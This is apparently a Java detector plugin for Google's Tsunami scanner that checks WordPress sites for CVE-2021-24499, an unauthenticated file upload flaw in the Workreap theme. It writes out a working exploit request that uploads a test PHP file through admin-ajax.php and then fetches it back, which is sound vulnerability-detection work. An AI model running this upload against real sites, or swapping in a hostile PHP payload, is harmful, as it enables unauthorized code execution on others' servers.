/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202124499;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.common.net.HttpHeaders.X_REQUESTED_WITH;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;

import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

@PluginInfo(
		type = PluginType.VULN_DETECTION,
		name = "CVE-2021-24499",
		version = "0.1",
		description = "The AJAX actions workreap_award_temp_file_uploader and workreap_temp_file_uploader did not " +
				"perform nonce checks, or validate that the request is from a valid user in any other way. " +
				"The endpoints allowed for uploading arbitrary files to the uploads/workreap-temp directory." +
				" Uploaded files were neither sanitized nor validated, allowing an unauthenticated visitor to " +
				"upload executable code such as php scripts.",
		author = "hh-hunter",
		bootstrapModule = CVE202124499DetectorBootstrapModule.class)

public final class CVE202124499VulnDetector implements VulnDetector {

	private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

	public static final String DETECTION_STRING = "5b88f0ba69ea93861fe8cfc2119aa645";


	private final HttpClient httpClient;

	private final Clock utcClock;

	// by the scanner.
	@Inject
	CVE202124499VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
		this.httpClient = checkNotNull(httpClient);
		this.utcClock = checkNotNull(utcClock);
	}

	@Override
	public DetectionReportList detect(
			TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
		logger.atInfo().log("CVE-2021-24499 starts detecting.");

		return DetectionReportList.newBuilder()
				.addAllDetectionReports(
						matchedServices.stream()
								.filter(NetworkServiceUtils::isWebService)
								.filter(this::isServiceVulnerable)
								.map(networkService -> buildDetectionReport(targetInfo, networkService))
								.collect(toImmutableList()))
				.build();
	}

	private boolean isServiceVulnerable(NetworkService networkService) {
		String targetUploadUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "wp-admin/admin-ajax.php";
		String targetFileUri   = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "wp-content/uploads/workreap-temp/vul0000test.php";

		try {
			ByteString payload = ByteString.copyFrom("-----------------------------vul0000test\n" +
					"        Content-Disposition: form-data; name=\"action\"\n" +
					"        workreap_award_temp_file_uploader\n" +
					"        -----------------------------vul0000test\n" +
					"        Content-Disposition: form-data; name=\"award_img\"; filename=\"vul0000test.php\"\n" +
					"        Content-Type: application/x-httpd-php\n" +
					"        <?php echo md5(\"TSUNAMI_COMMUNITY\"); ?>\n" +
					"        -----------------------------vul0000test--", "utf-8");

			httpClient.send(
					post(targetUploadUri)
							.setHeaders(
									HttpHeaders.builder()
											.addHeader(CONTENT_TYPE, "multipart/form-data; boundary=------------------------vul0000test")
											.addHeader(X_REQUESTED_WITH, "XMLHttpRequest")
											.build())
							.setRequestBody(payload)
							.build(),
					networkService);


			HttpResponse fileHttpResponse =
					httpClient.send(
							get(targetFileUri).withEmptyHeaders()
									.build(),
							networkService);

			if (fileHttpResponse.status().code() == 200 && fileHttpResponse.bodyString().get().contains(DETECTION_STRING)) {
				return true;
			}

		} catch (IOException e) {
			logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
			return false;
		}
		return false;
	}

	// This builds the DetectionReport message for a specific vulnerable network service.
	private DetectionReport buildDetectionReport(
			TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
		return DetectionReport.newBuilder()
				.setTargetInfo(targetInfo)
				.setNetworkService(vulnerableNetworkService)
				.setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
				.setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
				.setVulnerability(
						Vulnerability.newBuilder()
								.setMainId(
										VulnerabilityId.newBuilder()
												.setPublisher("TSUNAMI_COMMUNITY")
												.setValue("CVE_2021_24499"))
								.setSeverity(Severity.CRITICAL)
								.setTitle("CVE-2021-24499")
								.setDescription("The Workreap WordPress theme before 2.2.2 AJAX actions" +
										" workreap_award_temp_file_uploader and " +
										"workreap_temp_file_uploader did not perform nonce checks, or " +
										"validate that the request is from a valid user in any other " +
										"way. The endpoints allowed for uploading arbitrary files to " +
										"the uploads/workreap-temp directory. Uploaded files were " +
										"neither sanitized nor validated, allowing an unauthenticated " +
										"visitor to upload executable code such as php scripts."))
				.build();
	}
}
